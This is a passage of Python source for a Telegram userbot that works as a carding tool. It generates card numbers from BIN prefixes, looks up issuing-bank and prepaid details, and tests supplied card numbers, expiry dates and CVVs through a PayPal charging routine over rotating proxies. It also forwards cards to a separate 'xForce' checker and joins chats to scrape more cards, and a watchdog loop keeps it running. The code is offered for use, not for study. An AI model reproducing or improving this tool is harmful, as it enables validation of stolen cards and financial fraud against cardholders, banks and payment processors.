                        cmd = parts[0].lower().lstrip("/").split("@")[0]
                        args = parts[1] if len(parts) > 1 else ""

                        if cmd == "help":
                            await event.reply("Commands: /gen, /bin, /chkpp, /drop, /status, /addchat, /removechat, /clearchat")
                        elif cmd == "gen":
                            args_parts = args.strip().split()
                            if not args_parts:
                                await event.reply("Usage: `/gen 414720` or `/gen 414720 10`")
                                return
                            bin_prefix = args_parts[0][:6]
                            if not bin_prefix.isdigit():
                                await event.reply("Invalid BIN")
                                return
                            count = 1
                            if len(args_parts) > 1:
                                try: count = min(int(args_parts[1]), 100)
                                except: count = 1
                            bin_info = await get_bin_info(bin_prefix) if len(bin_prefix) >= 6 else None
                            cards = [generate_card_with_bin(bin_prefix) for _ in range(count)]
                            if bin_info:
                                header = f"┏━━━━━━━⍟\n┃ GENERATED {count} CARD{'S' if count>1 else ''} 💳\n┗━━━━━━━━━━━⊛\n[❃] 𝗕𝗿𝗮𝗻𝗱  ➜ {bin_info.get('brand','?')}\n[❃] 𝗧𝘆𝗽𝗲   ➜ {bin_info.get('type','?')}\n[❃] 𝗕𝗮𝗻𝗸   ➜ {bin_info.get('bank','?')}\n[❃] 𝗟𝗲𝘃𝗲𝗹  ➜ {bin_info.get('level','?')}\n[❃] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆➜ {bin_info.get('country','?')}\n[❃] 𝗙𝗶𝗿𝘀𝘁𝟲➜ {bin_prefix}\n\n"
                            else:
                                header = f"┏━━━━━━━⍟\n┃ GENERATED {count} CARD{'S' if count>1 else ''} 💳\n┗━━━━━━━━━━━⊛\n"
                            card_lines = [f"[{i}] `{card}`" for i, card in enumerate(cards, 1)]
                            full_msg = header + "\n".join(card_lines)
                            if len(full_msg) > 4000:
                                await event.reply(header + "\n".join(card_lines[:30]))
                                if count > 30:
                                    await event.reply("\n".join(card_lines[30:]))
                            else:
                                await event.reply(full_msg)
                        elif cmd == "bin":
                            if not args:
                                await event.reply("Usage: `/bin 414720`")
                                return
                            raw_digits = re.findall(r'\d{6,}', args)
                            bins = list(dict.fromkeys(d[:6] for d in raw_digits))
                            if not bins:
                                await event.reply("No valid BINs")
                                return
                            status_msg = await event.reply(f"🔍 Looking up {len(bins)} BIN(s)...")
                            results = await asyncio.gather(*[get_bin_info(b) for b in bins])
                            lines = []
                            for b, info in zip(bins, results):
                                if not info:
                                    lines.append(f"`{b}` — ❌ Not found")
                                else:
                                    flag = {"US":"🇺🇸","GB":"🇬🇧","CA":"🇨🇦","AU":"🇦🇺","DE":"🇩🇪","FR":"🇫🇷"}.get(info.get("country_code",""), "🌐")
                                    prepaid = " [PREPAID]" if info.get("prepaid") else ""
                                    lines.append(f"`{b}` {flag} {info.get('brand','?')} {info.get('type','?')}{prepaid} — {info.get('bank','Unknown')} | {info.get('country','Unknown')}")
                            chunk = []
                            for line in lines:
                                chunk.append(line)
                                if len("\n".join(chunk)) > 3800:
                                    await status_msg.edit("\n".join(chunk[:-1]))
                                    chunk = [chunk[-1]]
                            await status_msg.edit(f"┏━━━━━━━⍟\n┃ BIN LOOKUP 🔍 ({len(bins)} BINs)\n┗━━━━━━━━━━━⊛\n" + "\n".join(chunk))
                        elif cmd == "chkpp":
                            if not args:
                                await event.reply("Usage: `/chkpp CC|MM|YY|CVV`")
                                return
                            card = args.strip()
                            if len(card.split("|")) < 4:
                                await event.reply("Format: `CC|MM|YY|CVV`")
                                return
                            n = card.split("|")[0]
                            status_msg = await event.reply("🔄 PayPal...")
                            paypal_result = await asyncio.get_event_loop().run_in_executor(None, PayPalCharger(proxy=ProxyManager.get()).charge, card)
                            bin_info = await get_bin_info(n[:6]) if len(n) >= 6 else None
                            if paypal_result.startswith("CHARGED"): status = "CHARGED 💰"
                            elif paypal_result.startswith("APPROVED"): status = "APPROVED 🟢"
                            elif paypal_result.startswith("DECLINED"): status = "DECLINED 🔴"
                            else: status = "ERROR ⚠️"
                            response_text = paypal_result.split("|",1)[-1] if "|" in paypal_result else paypal_result
                            msg = f"┏━━━━━━━⍟\n┃ {status}\n┗━━━━━━━━━━━⊛\n[❃] 𝗖𝗮𝗿𝗱    ➜ `{card}`\n[❃] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➜ PayPal\n[❃] 𝗥𝗲𝘀𝗽    ➜ {response_text}\n"
                            if bin_info:
                                msg += f"[❃] 𝗕𝗿𝗮𝗻𝗱  ➜ {bin_info.get('brand','?')}\n[❃] 𝗧𝘆𝗽𝗲   ➜ {bin_info.get('type','?')}\n[❃] 𝗕𝗮𝗻𝗸   ➜ {bin_info.get('bank','?')}\n[❃] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆➜ {bin_info.get('country','?')}\n"
                            await status_msg.edit(msg)
                        elif cmd == "drop":
                            card_text = args.strip()
                            card_data = extract_card_from_text(card_text)
                            if not card_data:
                                await event.reply("Usage: `/drop CC|MM|YY|CVV`")
                                return
                            n, mm, yy, cvv, zip_code = card_data
                            await xforce.check_and_forward(n, mm, yy, cvv, zip_code=zip_code)
                        elif cmd == "status":
                            qsize = xforce._drop_queue.qsize() if xforce else 0
                            pw = "✅ ready" if PLAYWRIGHT_OK else "❌ disabled"
                            msg = f"📊 Status\nPlaywright: {pw}\nQueue depth: {qsize}\nLinks: {len(xforce.processed_links)}\nCards: {len(xforce.processed_cards)}"
                            await event.reply(msg)
                        elif cmd == "clearchat":
                            try: await client.delete_messages(event.chat_id, event.message.id)
                            except: pass
                            await event.reply("\n" * 50 + "🧹 Chat cleared")
                        elif cmd == "addchat":
                            if not args:
                                await event.reply("Usage: `/addchat <username or invite link>`")
                                return
                            chat_arg = args.strip()
                            if chat_arg in SOURCE_CHATS_RAW:
                                await event.reply(f"Already watching `{chat_arg}`")
                                return
                            entity = await join_and_resolve(chat_arg)
                            if entity:
                                SOURCE_CHATS_RAW.append(chat_arg)
                                _save_watched_chats(SOURCE_CHATS_RAW)
                                resolved.append(entity)
                                title = getattr(entity, 'title', None) or getattr(entity, 'username', chat_arg)
                                client.add_event_handler(handle_messages, events.NewMessage(chats=[entity]))
                                await event.reply(f"✅ Added `{chat_arg}` ({title})\nTotal: {len(SOURCE_CHATS_RAW)}")
                            else:
                                await event.reply(f"❌ Could not resolve `{chat_arg}`")
                        elif cmd == "removechat":
                            if not args:
                                await event.reply("Usage: `/removechat <username or invite link>`")
                                return
                            chat_arg = args.strip()
                            if chat_arg not in SOURCE_CHATS_RAW:
                                await event.reply(f"Not watching `{chat_arg}`")
                                return
                            SOURCE_CHATS_RAW.remove(chat_arg)
                            _save_watched_chats(SOURCE_CHATS_RAW)
                            await event.reply(f"✅ Removed `{chat_arg}`\nTotal: {len(SOURCE_CHATS_RAW)}")

                    client.add_event_handler(handle_commands, events.NewMessage(outgoing=True, pattern=r'^/(help|gen|bin|chkpp|clearchat|drop|status|addchat|removechat)\b'))
                    print(f"[✅] Listening for new messages in {len(resolved)} chat(s)...", flush=True)
                    await client.run_until_disconnected()

                async def _notify(msg: str):
                    try:
                        if client.is_connected():
                            await client.send_message(FORWARD_TARGET, msg)
                    except:
                        pass

                async def watchdog():
                    if RUN_MODE in ("both", "scraper"):
                        first_run = True
                        backoff = 15
                        while True:
                            try:
                                if not first_run:
                                    try:
                                        if client.is_connected():
                                            await client.disconnect()
                                    except:
                                        pass
                                    await asyncio.sleep(2)
                                    ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
                                    print(f"[WATCHDOG] Reconnecting at {ts}...", flush=True)
                                    try:
                                        await _notify(f"🔄 *Bot Restarted*\n⏰ {ts}\n✅ Back online.")
                                    except:
                                        pass
                                first_run = False
                                backoff = 15
                                await run_scraper()
                            except Exception as e:
                                ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
                                err_str = str(e)[:300]
                                logger.error(f"Scraper crashed: {e}")
                                print(f"[WATCHDOG] Crashed: {e} — retry in {backoff}s", flush=True)
                                try:
                                    await _notify(f"🚨 *Bot Crashed*\n⏰ {ts}\n❌ Error: `{err_str}`\n♻️ Restarting in {backoff}s...")
                                except:
                                    pass
                                await asyncio.sleep(backoff)
                                backoff = min(backoff * 2, 300)

                if __name__ == "__main__":
                    if RUN_MODE == "web":
                        run_flask()
                    else:
                        if RUN_MODE in ("both", "web"):
                            _ft = Thread(target=run_flask, daemon=True)
                            _ft.start()
                            print(f"[🌐] Flask server on port {PORT}", flush=True)
                        result = setup_playwright()
                        if result:
                            print("[OK] Playwright ready – xForce drops enabled", flush=True)
                        else:
                            print("[WARN] Playwright not available. xForce drops disabled.", flush=True)
                        outer_backoff = 15
                        while True:
                            try:
                                asyncio.run(watchdog())
                            except KeyboardInterrupt:
                                print("[MAIN] Stopped by user.", flush=True)
                                break
                            except Exception as e:
                                print(f"[MAIN] Event loop crashed: {e} — restarting in {outer_backoff}s...", flush=True)
                                time.sleep(outer_backoff)
                                outer_backoff = min(outer_backoff * 2, 300)